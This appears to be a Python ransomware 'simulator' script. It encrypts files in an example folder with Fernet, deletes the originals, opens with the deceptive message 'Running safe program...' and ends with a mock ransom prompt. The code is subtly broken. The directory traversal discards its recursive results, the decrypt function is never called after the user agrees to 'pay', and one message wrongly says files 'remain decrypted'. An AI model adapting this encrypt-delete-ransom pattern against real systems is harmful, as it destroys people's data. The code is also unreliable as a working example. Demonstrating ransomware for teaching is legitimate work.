import os
from pathlib import Path
from typing import List
from cryptography.fernet import Fernet
from rich.console import Console

console = Console()

def traverse_dir(dir: Path) -> List[Path]:
    """Traverse given dir and return list of files"""
    dir_list = []
    if dir.is_file():
        dir_list.append(dir)
    elif dir.is_dir():
        for file in dir.iterdir():
            traverse_dir(file)
    return dir_list


def encrypt(key, file: Path):
    """Take in the file to encrypt, the key to use, and save encrypted - deletes original."""
    fernet = Fernet(key)
    with open(file, "rb") as plain_file:
        data = plain_file.read()
        encrypted = fernet.encrypt(data)
    with open(os.path.join(os.getcwd(), Path("encrypted" + file.name)), "wb") as encrypt_file:
        encrypt_file.write(encrypted)
    os.remove(file)

def decrypt(key, file: Path):
    """Decrypts the encrypted file."""
    fernet = Fernet(key)
    with open(file, "rb") as cipher_file:
        data = cipher_file.read()
        decrypted = fernet.decrypt(data)
    with open(os.path.join(os.getcwd(), Path("decrypted" + file.name)), "wb") as decrypt_file:
        decrypt_file.write(decrypted)


def main():
    """Run simulator."""
    console.print("Running safe program...")
    key = Fernet.generate_key()
    file_list = traverse_dir(Path(os.path.join(os.getcwd(), Path("example-files"))))
    for file in file_list:
        encrypt(key, file)
    console.print("Surprise! Your files have been encrypted.")
    console.print("They would be deleted here if this was a malicious attack.")
    reply = input("And here's where money gets requested. Pay me? Y/N ")
    if reply.startswith("Y") or reply.startswith("y"):
        console.print("Thank you! Decrypting now.")

    else:
        console.print("Files remain decrypted.")


main()